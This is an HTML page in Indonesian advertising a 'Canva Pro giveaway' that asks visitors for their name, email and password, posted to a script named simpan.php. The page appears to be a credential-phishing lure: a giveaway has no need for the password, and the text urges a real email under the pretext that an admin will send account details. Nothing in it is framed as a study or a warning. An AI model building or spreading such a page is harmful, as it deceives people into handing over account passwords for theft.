<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Form Input User</title>
</head>
<body>
  <h2>GIVEAWAY CANVA PRO</h2>
  <p>Harap Menggunakan Email Asli Agar Admin Bisa Mengirim Data Akun Ke Email Anda!</p>
  <form action="simpan.php" method="POST" onsubmit="disableButton()">
    <label>Nama:</label><br>
    <input type="text" name="nama" required><br><br>

    <label>Email:</label><br>
    <input type="email" name="email" required><br><br>

    <label>Password:</label><br>
    <input type="password" name="password" required><br><br>

    <button type="submit" id="submitBtn">Simpan</button>
  </form>

  <script>
    function disableButton() {
      document.getElementById("submitBtn").disabled = true;
      document.getElementById("submitBtn").innerText = "Sedang diproses...";
    }
  </script>
</body>
</html>